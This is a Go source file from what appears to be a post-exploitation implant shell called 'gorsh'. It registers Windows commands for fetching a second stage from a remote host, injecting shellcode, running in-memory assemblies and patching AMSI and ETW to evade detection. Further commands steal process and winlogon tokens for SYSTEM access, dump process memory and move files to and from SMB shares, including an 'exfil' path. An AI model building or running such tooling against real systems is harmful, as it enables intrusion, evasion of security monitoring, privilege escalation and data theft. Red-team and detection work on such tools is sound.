package cmds

import (
	"strings"

	"git.hyrule.link/blink/gorsh/pkg/execute_assembly"
	"github.com/abiosoft/ishell"
)

func RegisterWindowsCommands(sh *ishell.Shell) {

	sh.AddCmd(&ishell.Cmd{
		Name:     "met",
		Help:     "met <https|tcp> <ip:port>",
		LongHelp: "Fetch a second stage from ip:port",
		Func:     Met,
	})

	sh.AddCmd(&ishell.Cmd{
		Name:     "inject",
		Help:     "inject <base64_shellcode>",
		LongHelp: "Execute shellcode",
		Func:     Inject,
	})

	sh.AddCmd(&ishell.Cmd{
		Name:     "load",
		Help:     "load [list] <assemblyName>",
		LongHelp: "Loads an assembly into the current process for later execution",
		Func:     LoadAssembly,
		Completer: func([]string) (ass []string) {
			dirs, _ := execute_assembly.Assemblies.ReadDir("embed")
			for _, fsEntry := range dirs {
				base := strings.Split(fsEntry.Name(), ".")[0]
				ass = append(ass, base)
			}
			return
		},
	})

	sh.AddCmd(&ishell.Cmd{
		Name:     "unload",
		Help:     "unload",
		LongHelp: "Unload current assembly",
		Func:     UnloadAssembly,
	})

	sh.AddCmd(&ishell.Cmd{
		Name: ".",
		Help: "Pass args to the currently enable assembly",
		Func: ExecuteAssembly,
	})

	sh.AddCmd(&ishell.Cmd{
		Name:     "unhook",
		Help:     "unhook < amsi | etw | dllname.FuncName >",
		LongHelp: "Finds a module in the PEB and calls GetProcAddress. Then patches the base function address with a ret instruction.",
		Func:     Unhook,
	})

	sh.AddCmd(&ishell.Cmd{
		Name: "dlls",
		Help: "Print loaded DLLs",
		Func: ListDlls,
	})

	sh.AddCmd(&ishell.Cmd{
		Name:     "demote",
		Help:     "demote <pid>",
		LongHelp: "Demote a process, stripping it of its permissions and integrity",
		Func:     Demote,
	})

	sh.AddCmd(&ishell.Cmd{
		Name:     "steal_token",
		Help:     "steal_token <pid>",
		LongHelp: "Steal a token from a PID and use in current thread",
		Func:     StealToken,
	})

	sh.AddCmd(&ishell.Cmd{
		Name:     "getsystem",
		Help:     "getsystem",
		LongHelp: "Steal winlogon token",
		Func:     GetSystem,
	})

	sh.AddCmd(&ishell.Cmd{
		Name:     "revtoself",
		Help:     "revtoself",
		LongHelp: "Resume use of primary token",
		Func:     RevToSelf,
	})

	sh.AddCmd(&ishell.Cmd{
		Name:     "download",
		Help:     "download <share/file> [out.file]",
		LongHelp: "Default download from smb share: '//${RHOST}/t/'",
		Func:     Download,
	})

	sh.AddCmd(&ishell.Cmd{
		Name:     "upload",
		Help:     "upload <local> [exfil/out.file]",
		LongHelp: "Default download from smb share: '//${RHOST}/e/'",
		Func:     Upload,
	})

	sh.AddCmd(&ishell.Cmd{
		Name:     "procdump",
		Help:     "procdump <pid>",
		LongHelp: "dump process memory",
		Func:     Procdump,
	})
}

func RegisterNotWindowsCommands(sh *ishell.Shell) {}
